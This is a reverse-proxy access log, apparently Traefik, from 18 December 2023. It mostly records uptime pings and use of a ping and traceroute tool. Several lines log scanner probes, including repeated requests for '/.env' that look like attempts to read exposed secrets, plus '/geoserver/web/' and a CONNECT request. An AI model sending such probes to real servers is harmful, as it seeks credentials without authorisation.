159.203.109.206 - - [18/Dec/2023:05:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3950 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3951 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3952 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3953 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:05:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3954 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:05:22:29 +0000] "GET /who HTTP/2.0" 404 153 "-" "-" 3955 "www@docker" "http://172.18.0.9:80" 3ms
173.48.140.140 - - [18/Dec/2023:05:22:29 +0000] "GET /favicon.ico HTTP/2.0" 404 153 "-" "-" 3956 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:22:36 +0000] "GET /trace HTTP/2.0" 404 146 "-" "-" 3957 "livetrace@docker" "http://172.18.0.3:80" 2ms
167.71.120.76 - - [18/Dec/2023:05:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3958 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:22:41 +0000] "GET /trace/ HTTP/2.0" 200 6062 "-" "-" 3959 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [18/Dec/2023:05:22:41 +0000] "GET /trace/styles.css?version=11 HTTP/2.0" 200 1367 "-" "-" 3960 "livetrace@docker" "http://172.18.0.3:80" 0ms
173.48.140.140 - - [18/Dec/2023:05:22:46 +0000] "GET /trace/startping.php?id=abfxwqom2 HTTP/2.0" 200 105 "-" "-" 3961 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [18/Dec/2023:05:22:47 +0000] "GET /trace/pollping.php?id=abfxwqom2 HTTP/2.0" 200 31 "-" "-" 3962 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:22:48 +0000] "GET /trace/pollping.php?id=abfxwqom2 HTTP/2.0" 200 56 "-" "-" 3963 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:22:49 +0000] "GET /trace/pollping.php?id=abfxwqom2 HTTP/2.0" 200 79 "-" "-" 3964 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:22:50 +0000] "GET /trace/pollping.php?id=abfxwqom2 HTTP/2.0" 200 105 "-" "-" 3965 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:22:51 +0000] "GET /trace/pollping.php?id=abfxwqom2 HTTP/2.0" 200 128 "-" "-" 3966 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:22:52 +0000] "GET /trace/pollping.php?id=abfxwqom2 HTTP/2.0" 200 152 "-" "-" 3967 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:22:53 +0000] "GET /trace/pollping.php?id=abfxwqom2 HTTP/2.0" 200 178 "-" "-" 3968 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:22:54 +0000] "GET /trace/pollping.php?id=abfxwqom2 HTTP/2.0" 200 199 "-" "-" 3969 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:22:54 +0000] "GET /trace/cleanping.php?id=abfxwqom2 HTTP/2.0" 200 71 "-" "-" 3970 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:23:00 +0000] "GET /trace/startping.php?id=hb4livntv HTTP/2.0" 200 105 "-" "-" 3971 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [18/Dec/2023:05:23:00 +0000] "GET /trace/starttrace.php?id=ynrrt35e4 HTTP/2.0" 200 106 "-" "-" 3972 "livetrace@docker" "http://172.18.0.3:80" 6ms
173.48.140.140 - - [18/Dec/2023:05:23:01 +0000] "GET /trace/pollping.php?id=hb4livntv HTTP/2.0" 200 33 "-" "-" 3973 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:23:01 +0000] "GET /trace/polltrace.php?id=ynrrt35e4 HTTP/2.0" 200 554 "-" "-" 3974 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:23:02 +0000] "GET /trace/pollping.php?id=hb4livntv HTTP/2.0" 200 54 "-" "-" 3975 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:23:02 +0000] "GET /trace/polltrace.php?id=ynrrt35e4 HTTP/2.0" 200 554 "-" "-" 3976 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:23:03 +0000] "GET /trace/pollping.php?id=hb4livntv HTTP/2.0" 200 86 "-" "-" 3977 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:23:03 +0000] "GET /trace/polltrace.php?id=ynrrt35e4 HTTP/2.0" 200 554 "-" "-" 3978 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:23:04 +0000] "GET /trace/pollping.php?id=hb4livntv HTTP/2.0" 200 110 "-" "-" 3979 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:23:04 +0000] "GET /trace/polltrace.php?id=ynrrt35e4 HTTP/2.0" 200 804 "-" "-" 3980 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [18/Dec/2023:05:23:04 +0000] "GET /trace/cleantrace.php?id=ynrrt35e4 HTTP/2.0" 200 72 "-" "-" 3981 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:23:05 +0000] "GET /trace/pollping.php?id=hb4livntv HTTP/2.0" 200 129 "-" "-" 3982 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:23:06 +0000] "GET /trace/pollping.php?id=hb4livntv HTTP/2.0" 200 153 "-" "-" 3983 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:23:07 +0000] "GET /trace/pollping.php?id=hb4livntv HTTP/2.0" 200 177 "-" "-" 3984 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:23:08 +0000] "GET /trace/pollping.php?id=hb4livntv HTTP/2.0" 200 205 "-" "-" 3985 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:23:08 +0000] "GET /trace/cleanping.php?id=hb4livntv HTTP/2.0" 200 71 "-" "-" 3986 "livetrace@docker" "http://172.18.0.3:80" 2ms
159.203.109.206 - - [18/Dec/2023:05:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3987 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:05:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3988 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3989 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3990 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3991 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:05:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3992 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:05:25:47 +0000] "GET /trace/startping.php?id=vtkmtrfmx HTTP/2.0" 200 105 "-" "-" 3993 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [18/Dec/2023:05:25:48 +0000] "GET /trace/pollping.php?id=vtkmtrfmx HTTP/2.0" 200 32 "-" "-" 3994 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:25:49 +0000] "GET /trace/pollping.php?id=vtkmtrfmx HTTP/2.0" 200 57 "-" "-" 3995 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:25:50 +0000] "GET /trace/pollping.php?id=vtkmtrfmx HTTP/2.0" 200 82 "-" "-" 3996 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:25:51 +0000] "GET /trace/pollping.php?id=vtkmtrfmx HTTP/2.0" 200 107 "-" "-" 3997 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:25:52 +0000] "GET /trace/pollping.php?id=vtkmtrfmx HTTP/2.0" 200 132 "-" "-" 3998 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:25:53 +0000] "GET /trace/pollping.php?id=vtkmtrfmx HTTP/2.0" 200 156 "-" "-" 3999 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:25:54 +0000] "GET /trace/pollping.php?id=vtkmtrfmx HTTP/2.0" 200 180 "-" "-" 4000 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:25:55 +0000] "GET /trace/pollping.php?id=vtkmtrfmx HTTP/2.0" 200 201 "-" "-" 4001 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:25:55 +0000] "GET /trace/cleanping.php?id=vtkmtrfmx HTTP/2.0" 200 71 "-" "-" 4002 "livetrace@docker" "http://172.18.0.3:80" 2ms
159.203.109.206 - - [18/Dec/2023:05:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4003 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:05:26:23 +0000] "GET /trace/ HTTP/2.0" 200 6062 "-" "-" 4004 "livetrace@docker" "http://172.18.0.3:80" 4ms
167.71.120.76 - - [18/Dec/2023:05:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4005 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:05:26:45 +0000] "GET /trace/startping.php?id=2ygfcbzee HTTP/2.0" 200 105 "-" "-" 4006 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [18/Dec/2023:05:26:45 +0000] "GET /trace/starttrace.php?id=ipfg6e43v HTTP/2.0" 200 106 "-" "-" 4007 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [18/Dec/2023:05:26:46 +0000] "GET /trace/polltrace.php?id=ipfg6e43v HTTP/2.0" 200 406 "-" "-" 4009 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:26:46 +0000] "GET /trace/pollping.php?id=2ygfcbzee HTTP/2.0" 200 34 "-" "-" 4008 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:26:47 +0000] "GET /trace/pollping.php?id=2ygfcbzee HTTP/2.0" 200 60 "-" "-" 4010 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:26:47 +0000] "GET /trace/polltrace.php?id=ipfg6e43v HTTP/2.0" 200 406 "-" "-" 4011 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [18/Dec/2023:05:26:48 +0000] "GET /trace/pollping.php?id=2ygfcbzee HTTP/2.0" 200 85 "-" "-" 4012 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:26:48 +0000] "GET /trace/polltrace.php?id=ipfg6e43v HTTP/2.0" 200 406 "-" "-" 4013 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:26:49 +0000] "GET /trace/polltrace.php?id=ipfg6e43v HTTP/2.0" 200 655 "-" "-" 4015 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:26:49 +0000] "GET /trace/pollping.php?id=2ygfcbzee HTTP/2.0" 200 109 "-" "-" 4014 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:26:49 +0000] "GET /trace/cleantrace.php?id=ipfg6e43v HTTP/2.0" 200 72 "-" "-" 4016 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:26:50 +0000] "GET /trace/pollping.php?id=2ygfcbzee HTTP/2.0" 200 135 "-" "-" 4017 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:26:51 +0000] "GET /trace/pollping.php?id=2ygfcbzee HTTP/2.0" 200 160 "-" "-" 4018 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:26:52 +0000] "GET /trace/pollping.php?id=2ygfcbzee HTTP/2.0" 200 184 "-" "-" 4019 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:26:53 +0000] "GET /trace/pollping.php?id=2ygfcbzee HTTP/2.0" 200 206 "-" "-" 4020 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:26:53 +0000] "GET /trace/cleanping.php?id=2ygfcbzee HTTP/2.0" 200 71 "-" "-" 4021 "livetrace@docker" "http://172.18.0.3:80" 2ms
159.203.109.206 - - [18/Dec/2023:05:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4022 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4023 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:05:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4024 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4025 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:05:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4026 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4027 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4028 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4029 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4030 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:05:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4031 "www@docker" "http://172.18.0.9:80" 0ms
57.129.23.166 - - [18/Dec/2023:05:32:02 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4032 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [18/Dec/2023:05:32:02 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4033 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:05:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4034 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4035 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4036 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4037 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4038 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4039 "www@docker" "http://172.18.0.9:80" 0ms
65.49.1.19 - - [18/Dec/2023:05:34:40 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4040 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:05:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4041 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4042 "www@docker" "http://172.18.0.9:80" 1ms
65.49.1.17 - - [18/Dec/2023:05:36:04 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4043 "web-to-websecure@internal" "-" 0ms
65.49.1.16 - - [18/Dec/2023:05:36:04 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4044 "-" "-" 0ms
95.214.235.169 - - [18/Dec/2023:05:36:10 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4045 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [18/Dec/2023:05:36:11 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4046 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:05:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4047 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4048 "www@docker" "http://172.18.0.9:80" 0ms
65.49.1.15 - - [18/Dec/2023:05:36:38 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 4049 "web-to-websecure@internal" "-" 0ms
65.49.1.11 - - [18/Dec/2023:05:37:12 +0000] "GET /geoserver/web/ HTTP/1.1" 301 17 "-" "-" 4050 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:05:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4051 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4052 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:05:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4053 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4054 "www@docker" "http://172.18.0.9:80" 0ms
90.151.171.106 - - [18/Dec/2023:05:38:55 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 4055 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [18/Dec/2023:05:39:05 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 4056 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:05:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4057 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4058 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4059 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4060 "www@docker" "http://172.18.0.9:80" 1ms
192.155.88.231 - - [18/Dec/2023:05:40:47 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4061 "-" "-" 0ms
95.214.235.169 - - [18/Dec/2023:05:40:56 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4062 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [18/Dec/2023:05:40:59 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4063 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:05:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4064 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4065 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:05:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4066 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4067 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4068 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4069 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4070 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4071 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4072 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4073 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:05:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4074 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4075 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:05:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4076 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4077 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4078 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:05:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4079 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4080 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4081 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:05:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4082 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:05:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4083 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:05:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4084 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4085 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4086 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4087 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4088 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4089 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4090 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4091 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4092 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4093 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4094 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4095 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4096 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4097 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:05:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4098 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4099 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4100 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4101 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:06:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4102 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:06:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4103 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:06:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4104 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:06:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4105 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:06:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4106 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:06:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4107 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:06:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4108 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:06:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4109 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:06:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4110 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:06:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4111 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:06:04:43 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4112 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:06:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4113 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:06:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4114 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:06:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4115 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:06:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4116 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:06:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4117 "www@docker" "http://172.18.0.9:80" 0ms
